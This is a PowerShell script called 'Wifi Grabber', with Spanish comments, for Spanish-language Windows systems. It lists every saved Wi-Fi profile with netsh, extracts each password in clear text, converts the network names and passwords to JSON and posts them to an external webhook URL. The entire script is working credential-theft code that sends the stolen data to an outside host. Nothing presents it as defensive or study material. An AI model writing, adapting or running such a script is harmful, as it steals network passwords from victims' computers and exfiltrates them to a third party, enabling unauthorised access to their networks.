<#
  Wifi Grabber – Webhook para Windows en Español (captura “Perfil de todos los usuarios”)
#>

# URL de tu webhook
$webhook = 'https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64'

# 1) Listar y parsear perfiles
$perfiles = netsh wlan show profiles `
  | Select-String 'Perfil de todos los usuarios\s*:\s*(.+)$' `
  | ForEach-Object {
      $ssid = $_.Matches[0].Groups[1].Value.Trim()
      # 2) Obtener la contraseña en claro
      $det = netsh wlan show profile name="$ssid" key=clear
      $line = $det | Select-String 'Contenido de la clave\s*:\s*(.+)$'
      $pass = if ($line) { $line.Matches[0].Groups[1].Value.Trim() } else { '' }
      [PSCustomObject]@{ Profile = $ssid; Password = $pass }
  }

# 3) Pasar a JSON
$json = $perfiles | ConvertTo-Json

# (DEBUG) Muestra el JSON en pantalla
Write-Host "JSON a enviar:`n$json`n"

# 4) Enviar al webhook
try {
    Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body $json
    Write-Host "✅ Enviado correctamente."
} catch {
    Write-Error "❌ Error al enviar: $_"
}

# 5) Pausa para que veas resultados
Read-Host -Prompt 'Presiona ENTER para cerrar'
